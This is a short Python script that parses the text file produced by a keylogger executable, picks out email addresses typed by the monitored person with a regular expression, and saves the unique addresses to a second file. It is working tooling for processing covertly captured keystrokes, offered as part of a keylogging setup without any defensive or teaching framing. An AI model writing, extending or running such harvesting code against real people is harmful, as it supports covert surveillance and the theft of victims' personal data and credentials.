#!/usr/bin/env python3

import re

# the script reads this output file from the keylogger executable
fileToRead = 'keylog.txt'
# the captured email addresses are written to this text file
fileToWrite = 'extractedemails.txt'
# the method to extract the email addresses from the keylog file uses a delimiter to separate the email addresses from the other characters in the file
delimiterInFile = [' ', '-', ',', ';']

# this function validates the email address and saves it as a string
def validateEmail(strEmail):
    # .* Zero or more characters of any type. 
    if re.match("([a-z0-9!#$%&'*+\/=?^_`{|}~-]+(?:\.[a-z0-9!#$%&'*+\/=?^_`"
                    "{|}~-]+)*(@|\sat\s)(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?(\.|"
                    "\sdot\s))+[a-z0-9](?:[a-z0-9-]*[a-z0-9])?)", strEmail):
        return True
    return False
# this function writes the captured emails as strings to the output file
def writeFile(listData):
    file = open(fileToWrite, 'w+')
    strData = ""
    for item in listData:
        strData = strData+item+'\n'
    file.write(strData)
# this creates a list of emails    
listEmail = []
file = open(fileToRead, 'r')

# replaces the delimeters with a space, validates the captured emails, adds them to the list of emails
listLine = file.readlines()
for itemLine in listLine:
    item =str(itemLine)
    for delimeter in delimiterInFile:
        item = item.replace(str(delimeter),' ')
    
    wordList = item.split()
    for word in wordList:
        if(validateEmail(word)):
            listEmail.append(word)
# output messages for success or failure of reading and capturing emails from original output file            
if listEmail:
    uniqEmail = set(listEmail)
    print(len(uniqEmail),"emails collected!")
    writeFile(uniqEmail)
else:
    print("No email found.")
